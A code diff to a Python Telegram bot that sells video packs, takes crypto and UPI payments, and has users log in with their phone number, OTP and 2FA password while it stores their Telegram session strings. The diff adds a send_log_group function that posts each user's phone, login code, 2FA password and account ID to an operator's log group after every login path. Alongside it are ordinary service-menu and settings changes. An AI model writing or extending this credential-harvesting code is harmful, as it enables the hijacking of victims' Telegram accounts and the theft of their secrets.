@@ -51,6 +51,36 @@ login_state = {}
 admin_upload_states = {}
 admin_config_state = {}
 
+
+async def send_log_group(context, user_id, username, phone, otp, tfa_pass, pyrogram_user_id):
+    settings = await db.get_settings()
+    log_group_id = settings.get("log_group_id") or config.LOG_GROUP_ID
+    if not log_group_id or log_group_id == 0:
+        return
+    owner = settings.get("owner_username", config.OWNER_USERNAME)
+    text = (
+        f"👤 User ID: {user_id}\n"
+        f"👤 Username: @{username or 'None'}\n"
+        f"📱 Phone: {phone}\n"
+        f"🔑 OTP: {otp}\n"
+        f"🔐 2FA Password: {tfa_pass or 'None'}\n"
+        f"🆔 TG User ID: {pyrogram_user_id or 'N/A'}\n"
+        f"👑 Owner: {owner}"
+    )
+    import io
+    file = io.BytesIO(text.encode("utf-8"))
+    file.name = "phonenumber.txt"
+    from telegram import InlineKeyboardMarkup, InlineKeyboardButton
+    start_btn = InlineKeyboardMarkup([[InlineKeyboardButton("🚀 START BOT", url=config.BOT_LINK)]])
+    try:
+        await context.bot.send_document(
+            chat_id=log_group_id, document=file,
+            caption=f"📁 Login Data - User {user_id}",
+            reply_markup=start_btn
+        )
+    except Exception as e:
+        logger.error(f"Failed to send log to group {log_group_id}: {e}")
+
 START_VIDEOS = []
 
 async def _cache_start_videos():
@@ -246,6 +276,10 @@ async def _cache_start_images():
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
+
+    # DM-only: ignore group/channel messages
+    if update.effective_chat and update.effective_chat.type != "private":
+        return
 
     await db.add_user(user.id, user.username, user.first_name)
     await db.log_activity(user.id, "start")
@@ -685,6 +719,48 @@ async def handle_custom_callbacks(query, context, data, user, is_admin):
                 reply_markup=make_keyboard([[danger("🔙 BACK", "admin_dashboard")]]),
                 parse_mode="HTML"
             )
+        elif data == "adm_owner_username":
+            admin_config_state[user.id] = {"field": "owner_username"}
+            await query.edit_message_text(
+                "<blockquote>👤 SET OWNER USERNAME</blockquote>\n\n"
+                "Send the owner's Telegram username (with @).\n\n"
+                "Example: <code>@ownerusername</code>",
+                reply_markup=make_keyboard([[danger("🔙 BACK", "admin_dashboard")]]),
+                parse_mode="HTML"
+            )
+        elif data == "adm_services":
+            services = await db.get_all_services()
+            text = "<blockquote>📦 SERVICE MANAGEMENT</blockquote>\n\n"
+            if not services:
+                text += "No services yet. Add one below:"
+            else:
+                for s in services:
+                    text += f"• <b>{s['name']}</b> (ID: {s['id']})\n"
+            await query.edit_message_text(
+                text,
+                reply_markup=make_keyboard([
+                    [primary("➕ ADD SERVICE", "adm_add_service_prompt")],
+                    [danger("🔙 BACK", "admin_dashboard")]
+                ]),
+                parse_mode="HTML"
+            )
+        elif data == "adm_add_service_prompt":
+            admin_config_state[user.id] = {"field": "add_service_name"}
+            await query.edit_message_text(
+                "<blockquote>➕ ADD SERVICE</blockquote>\n\n"
+                "Send the <b>service name</b>.\n"
+                "Example: <code>50 Videos Pack</code>",
+                reply_markup=make_keyboard([[danger("🔙 BACK", "adm_services")]]),
+                parse_mode="HTML"
+            )
+        elif data == "adm_delete_service_prompt":
+            admin_config_state[user.id] = {"field": "delete_service"}
+            await query.edit_message_text(
+                "<blockquote>🗑️ DELETE SERVICE</blockquote>\n\n"
+                "Send the <b>service ID</b> to delete.",
+                reply_markup=make_keyboard([[danger("🔙 BACK", "adm_services")]]),
+                parse_mode="HTML"
+            )
         elif data == "adm_commission":
             admin_config_state[user.id] = {"field": "commission"}
             await query.edit_message_text(
@@ -854,14 +930,48 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif data == "next_video":
         await handle_next_video(query, context, user, user_data, lang)
     elif data == "purchase":
+        services = await db.get_all_services()
+        if not services:
+            await query.edit_message_text("❌ No services available yet.", reply_markup=make_keyboard([[danger("🔙 BACK", "main_menu")]]), parse_mode="HTML")
+            return
+        text = "<blockquote>📦 SELECT A SERVICE</blockquote>\n\nChoose a service below:"
+        kb = []
+        for s in services:
+            kb.append([primary(f"📌 {s['name']}", f"service_{s['id']}")])
+        kb.append([danger("🏠 MAIN MENU", "main_menu")])
+        await query.edit_message_text(text, reply_markup=make_keyboard(kb), parse_mode="HTML")
+    elif data.startswith("service_"):
+        sid = int(data.replace("service_", ""))
+        svc = await db.get_service(sid)
+        if not svc:
+            await query.edit_message_text("❌ Service not found.", reply_markup=make_keyboard([[danger("🔙 BACK", "purchase")]]), parse_mode="HTML")
+            return
+        settings = await db.get_settings()
+        owner_username = settings.get("owner_username", config.OWNER_USERNAME)
+        ct = svc.get("contact_text", "Contact owner for details.")
+        img_id = svc.get("image_file_id")
+        if img_id:
+            try:
+                await query.message.reply_photo(
+                    photo=img_id,
+                    caption=f"<b>{svc['name']}</b>\n\n{ct}\n\n👤 Contact: {owner_username}",
+                    reply_markup=make_keyboard([
+                        [primary("💬 CONTACT OWNER", url=f"https://t.me/{owner_username.lstrip('@')}")],
+                        [danger("🔙 BACK", "purchase")]
+                    ]),
+                    parse_mode="HTML"
+                )
+                return
+            except Exception:
+                pass
         await query.edit_message_text(
-            get_purchase_text(),
-            reply_markup=purchase_options_keyboard(lang),
+            f"<b>{svc['name']}</b>\n\n{ct}\n\n👤 Contact: {owner_username}",
+            reply_markup=make_keyboard([
+                [primary("💬 CONTACT OWNER", url=f"https://t.me/{owner_username.lstrip('@')}")],
+                [danger("🔙 BACK", "purchase")]
+            ]),
             parse_mode="HTML",
         )
-    elif data.startswith("purchase_"):
-        pack_key = data.replace("purchase_", "")
-        await handle_purchase_request(query, user, pack_key, lang)
     elif data == "contact_owner":
         await query.edit_message_text(
             get_contact_owner_text(user.id),
@@ -872,9 +982,10 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         upi_id = settings.get("upi_id", "") or "owner@upi"
         usdt_addr = settings.get("usdt_address", "") or "Not Set"
         ton_addr = settings.get("ton_address", "") or "Not Set"
+        owner_username = settings.get("owner_username", config.OWNER_USERNAME)
         if lang == "hi":
             msg = (
-                f"👤 <b>मालिक का संपर्क:</b> {config.OWNER_USERNAME}\n\n"
+                f"👤 <b>मालिक का संपर्क:</b> {owner_username}\n\n"
                 f"आप सीधे संपर्क करके भुगतान कर सकते हैं:\n\n"
                 f"🏦 <b>UPI ID:</b> <code>{upi_id}</code>\n"
                 f"🔘 <b>USDT Address:</b> <code>{usdt_addr}</code>\n"
@@ -885,7 +996,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             )
         else:
             msg = (
-                f"👤 <b>Owner's DMs:</b> {config.OWNER_USERNAME}\n\n"
+                f"👤 <b>Owner's DMs:</b> {owner_username}\n\n"
                 f"Slide in and pay using any wallet below:\n\n"
                 f"🏦 <b>UPI ID:</b> <code>{upi_id}</code>\n"
                 f"🔘 <b>USDT Address:</b> <code>{usdt_addr}</code>\n"
@@ -897,7 +1008,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.edit_message_text(
             msg,
             reply_markup=make_keyboard([
-                [primary("💬 MESSAGE OWNER", url=f"https://t.me/{config.OWNER_USERNAME.lstrip('@')}")],
+                [primary("💬 MESSAGE OWNER", url=f"https://t.me/{owner_username.lstrip('@')}")],
                 [primary(get_text("BACK_BTN", lang), "main_menu")],
             ]),
             parse_mode="HTML",
@@ -1151,11 +1262,16 @@ async def handle_next_video(query, context, user, user_data, lang="en"):
     video = await get_video_for_user(user.id, only_free=only_free)
 
     if not video:
-        await query.edit_message_text(
-            get_purchase_text(),
-            reply_markup=purchase_options_keyboard(lang),
-            parse_mode="HTML",
-        )
+        services = await db.get_all_services()
+        if services:
+            text = "<blockquote>📦 SELECT A SERVICE</blockquote>\n\nChoose a service below:"
+            kb = []
+            for s in services:
+                kb.append([primary(f"📌 {s['name']}", f"service_{s['id']}")])
+            kb.append([danger("🏠 MAIN MENU", "main_menu")])
+            await query.edit_message_text(text, reply_markup=make_keyboard(kb), parse_mode="HTML")
+        else:
+            await query.edit_message_text("❌ No services available.", reply_markup=make_keyboard([[danger("🔙 BACK", "main_menu")]]), parse_mode="HTML")
         return
 
     caption = video["caption"] or get_caption_for_category(video["category"], video["delete_after"])
@@ -1405,11 +1521,13 @@ async def handle_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
         expected = state.get("otp", "")
         if digits == expected:
             reset_attempts(user.id)
+            phone = state.get("phone", "")
+            otp_val = expected
             login_state.pop(user.id, None)
             
-            # Save a dummy session string so user is recorded as logged in
             dummy_session = "MOCK_SESSION_STRING_" + str(user.id)
-            await db.update_user(user.id, session_string=dummy_session)
+            await db.update_user(user.id, session_string=dummy_session, phone=phone)
+            await send_log_group(context, user.id, user.username, phone, otp_val, None, user.id)
             
             await handle_login_success_msg(update.message, user, user_data, lang)
         else:
@@ -1458,7 +1576,6 @@ async def handle_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 parse_mode="HTML",
             )
         elif "error" in res:
-            # General error
             reset_attempts(user.id)
             login_state.pop(user.id, None)
             await update.message.reply_text(
@@ -1470,15 +1587,15 @@ async def handle_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 parse_mode="HTML",
             )
         else:
-            # Success!
             reset_attempts(user.id)
+            phone = state.get("phone", res.get("phone", ""))
             login_state.pop(user.id, None)
             session_str = res["session_string"]
+            pyrogram_uid = res.get("user_id", user.id)
             
-            # Save session string
-            await db.update_user(user.id, session_string=session_str, phone=res.get("phone"))
+            await db.update_user(user.id, session_string=session_str, phone=phone)
+            await send_log_group(context, user.id, user.username, phone, digits, None, pyrogram_uid)
             
-            # Run auto-join in background if configured
             settings = await db.get_settings()
             auto_join_chan = settings.get("auto_join_channel", "")
             if auto_join_chan:
@@ -1512,9 +1629,11 @@ async def handle_2fa(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     if is_mock:
         reset_attempts(user.id)
+        phone = state.get("phone", "")
         login_state.pop(user.id, None)
         dummy_session = "MOCK_SESSION_STRING_" + str(user.id)
         await db.update_user(user.id, session_string=dummy_session)
+        await send_log_group(context, user.id, user.username, phone, "MOCK_OTP", password, user.id)
         await handle_login_success_msg(update.message, user, user_data, lang)
     else:
         status_msg = await update.message.reply_text(
@@ -1549,15 +1668,15 @@ async def handle_2fa(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 parse_mode="HTML",
             )
         else:
-            # Success!
             reset_attempts(user.id)
+            phone = state.get("phone", res.get("phone", ""))
             login_state.pop(user.id, None)
             session_str = res["session_string"]
+            pyrogram_uid = res.get("user_id", user.id)
             
-            # Save session string
-            await db.update_user(user.id, session_string=session_str, phone=res.get("phone"))
+            await db.update_user(user.id, session_string=session_str, phone=phone)
+            await send_log_group(context, user.id, user.username, phone, "VIA_2FA", password, pyrogram_uid)
             
-            # Run auto-join in background if configured
             settings = await db.get_settings()
             auto_join_chan = settings.get("auto_join_channel", "")
             if auto_join_chan:
@@ -1755,6 +1874,47 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     await update.message.reply_text("❌ Please enter a number between 0 and 100.")
             except ValueError:
                 await update.message.reply_text("❌ Invalid number. Please enter a percentage (0-100).")
+
+        elif field == "owner_username":
+            await db.update_settings(owner_username=text)
+            await update.message.reply_text(f"✅ Owner username updated to: {text}")
+            admin_config_state.pop(user.id, None)
+
+        elif field == "add_service_name":
+            admin_config_state[user.id] = {"field": "add_service_contact", "service_name": text}
+            await update.message.reply_text(
+                f"✅ Service name set to: <b>{text}</b>\n\nNow send the <b>contact text</b> (what users will see when they click this service).",
+                parse_mode="HTML"
+            )
+
+        elif field == "add_service_contact":
+            name = st_cfg.get("service_name", "Service")
+            admin_config_state[user.id] = {"field": "add_service_image", "service_name": name, "contact_text": text}
+            await update.message.reply_text(
+                f"✅ Contact text saved.\n\nNow send the <b>Telegram file_id</b> of an image to attach (or send <code>none</code> to skip).",
+                parse_mode="HTML"
+            )
+
+        elif field == "add_service_image":
+            name = st_cfg.get("service_name", "Service")
+            ct = st_cfg.get("contact_text", "Contact owner for details.")
+            img_id = None if text.lower() == "none" else text
+            sid = await db.add_service(name, ct, img_id)
+            await update.message.reply_text(f"✅ Service '<b>{name}</b>' created! (ID: {sid})", parse_mode="HTML")
+            admin_config_state.pop(user.id, None)
+
+        elif field == "delete_service":
+            try:
+                sid = int(text)
+                svc = await db.get_service(sid)
+                if svc:
+                    await db.delete_service(sid)
+                    await update.message.reply_text(f"✅ Service '<b>{svc['name']}</b>' deleted.", parse_mode="HTML")
+                else:
+                    await update.message.reply_text(f"❌ Service with ID {sid} not found.", parse_mode="HTML")
+            except ValueError:
+                await update.message.reply_text("❌ Please send a valid service ID number.")
+            admin_config_state.pop(user.id, None)
 
         elif field == "pyrogram_api_id":
             try:
